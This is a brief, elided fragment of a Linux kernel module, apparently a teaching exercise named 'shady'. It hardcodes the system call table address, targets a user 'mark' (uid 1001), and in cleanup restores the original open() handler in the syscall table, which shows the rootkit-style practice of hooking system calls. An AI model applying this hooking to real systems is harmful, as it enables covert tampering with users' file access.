...
//static unsigned long ia32_sys_call_table_address = ffffffff81809ca0;
static unsigned long *sys_call_table_address = (unsigned long *) 0xffffffff81801400;
static char * name = "mark";
static unsigned int uid_mark = 1001;
/* ================================================================ */
...
shady_cleanup_module(int devices_to_destroy)
{
  ...
  (sys_call_table_address)[__NR_open] = old_open;
